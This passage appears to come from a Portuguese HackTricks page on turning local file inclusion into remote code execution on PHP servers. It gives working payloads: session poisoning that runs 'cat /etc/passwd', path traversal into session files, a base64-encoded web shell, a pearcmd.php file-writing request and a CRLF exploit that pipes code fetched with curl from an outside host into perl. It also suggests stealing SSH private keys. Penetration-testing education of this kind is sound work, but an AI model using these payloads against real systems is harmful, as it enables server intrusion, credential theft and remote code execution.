/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Defina o cookie como `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Use a LFI para incluir o arquivo de sess√£o PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se o ssh estiver ativo, verifique qual usu√°rio est√° sendo utilizado (/proc/self/status & /etc/passwd) e tente acessar **\<HOME>/.ssh/id\_rsa**

### **Via** **vsftpd** _**logs**_

Os logs para o servidor FTP vsftpd est√£o localizados em _**/var/log/vsftpd.log**_. No cen√°rio em que uma vulnerabilidade de Local File Inclusion (LFI) existe, e o acesso a um servidor vsftpd exposto √© poss√≠vel, os seguintes passos podem ser considerados:

1. Injete um payload PHP no campo de nome de usu√°rio durante o processo de login.
2. Ap√≥s a inje√ß√£o, utilize o LFI para recuperar os logs do servidor de _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Como mostrado em [este](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artigo, o filtro PHP base64 simplesmente ignora n√£o-base64. Voc√™ pode usar isso para contornar a verifica√ß√£o da extens√£o do arquivo: se voc√™ fornecer base64 que termina com ".php", ele apenas ignorar√° o "." e anexar√° "php" ao base64. Aqui est√° um exemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (sem arquivo necess√°rio)

Este [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que voc√™ pode usar **filtros php para gerar conte√∫do arbitr√°rio** como sa√≠da. O que basicamente significa que voc√™ pode **gerar c√≥digo php arbitr√°rio** para o include **sem precisar escrev√™-lo** em um arquivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via falha de segmenta√ß√£o

**Envie** um arquivo que ser√° armazenado como **tempor√°rio** em `/tmp`, ent√£o na **mesma requisi√ß√£o,** acione uma **falha de segmenta√ß√£o**, e ent√£o o **arquivo tempor√°rio n√£o ser√° deletado** e voc√™ pode procur√°-lo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via armazenamento de arquivos tempor√°rios do Nginx

Se voc√™ encontrou uma **Inclus√£o de Arquivo Local** e o **Nginx** est√° rodando na frente do PHP, voc√™ pode ser capaz de obter RCE com a seguinte t√©cnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Se voc√™ encontrou uma **Inclus√£o de Arquivo Local** mesmo que voc√™ **n√£o tenha uma sess√£o** e `session.auto_start` esteja `Desligado`. Se voc√™ fornecer o **`PHP_SESSION_UPLOAD_PROGRESS`** nos dados **multipart POST**, o PHP ir√° **habilitar a sess√£o para voc√™**. Voc√™ poderia abusar disso para obter RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via uploads de arquivos tempor√°rios no Windows

Se voc√™ encontrou uma **Inclus√£o de Arquivo Local** e o servidor est√° rodando em **Windows**, voc√™ pode conseguir RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + argumentos de URL

Como [**explicado neste post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), o script `/usr/local/lib/phppearcmd.php` existe por padr√£o nas imagens docker do php. Al√©m disso, √© poss√≠vel passar argumentos para o script via URL porque est√° indicado que se um par√¢metro de URL n√£o tiver um `=`, ele deve ser usado como um argumento.

A seguinte requisi√ß√£o cria um arquivo em `/tmp/hello.php` com o conte√∫do `<?=phpinfo()?>`:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

O seguinte explora uma vulnerabilidade CRLF para obter RCE (de [**aqui**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file\_uploads = on)

Se voc√™ encontrou uma **Local File Inclusion** e um arquivo expondo **phpinfo()** com file\_uploads = on, voc√™ pode obter RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Se voc√™ encontrou uma **Local File Inclusion** e **pode exfiltrar o caminho** do arquivo tempor√°rio, MAS o **servidor** est√° **verificando** se o **arquivo a ser inclu√≠do tem marcas PHP**, voc√™ pode tentar **contornar essa verifica√ß√£o** com esta **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via eternal waiting + bruteforce

Se voc√™ pode abusar do LFI para **fazer upload de arquivos tempor√°rios** e fazer o servidor **congelar** a execu√ß√£o do PHP, voc√™ poderia ent√£o **for√ßar nomes de arquivos durante horas** para encontrar o arquivo tempor√°rio:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### To Fatal Error

Se voc√™ incluir qualquer um dos arquivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Voc√™ precisa incluir o mesmo duas vezes para gerar esse erro).

**Eu n√£o sei como isso √© √∫til, mas pode ser.**\
_Mesmo que voc√™ cause um PHP Fatal Error, os arquivos tempor√°rios do PHP enviados s√£o exclu√≠dos._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Hacking Insights**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e nos desafios do hacking

**Real-Time Hack News**\
Mantenha-se atualizado com o mundo do hacking em ritmo acelerado atrav√©s de not√≠cias e insights em tempo real

**Latest Announcements**\
Fique informado sobre os novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
